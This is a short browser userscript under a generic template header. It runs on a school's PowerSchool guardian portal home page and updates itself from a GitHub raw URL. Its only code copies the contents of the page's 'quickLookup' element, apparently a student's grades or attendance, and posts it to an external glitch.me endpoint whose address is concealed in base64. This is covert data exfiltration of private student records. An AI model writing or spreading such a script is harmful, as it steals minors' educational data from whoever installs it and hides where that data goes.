// ==UserScript==
// @name         New Userscript
// @namespace    http://tampermonkey.net/
// @version      0.4
// @description  try to take over the world!
// @author       You
// @match        https://ps.pcti.tec.nj.us/guardian/home.html
// @match        https://ps.pcti.tec.nj.us/guardian/home.html?*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=github.com
// @grant        none
// @downloadURL  https://raw.githubusercontent.com/AG231921/jasoc/main/UserScript.js
// @updateURL    https://raw.githubusercontent.com/AG231921/jasoc/main/UserScript.js
// ==/UserScript==

var btn = document.getElementById("quickLookup");

var str = btn.innerHTML;

fetch(atob("aHR0cHM6Ly92ZW51cy1kYXRhLmdsaXRjaC5tZS9yZWdpc3Rlci1kYXRh"), {
    method: "post",
    body: str
  }).then(function(response) {
    console.log(response);
  })
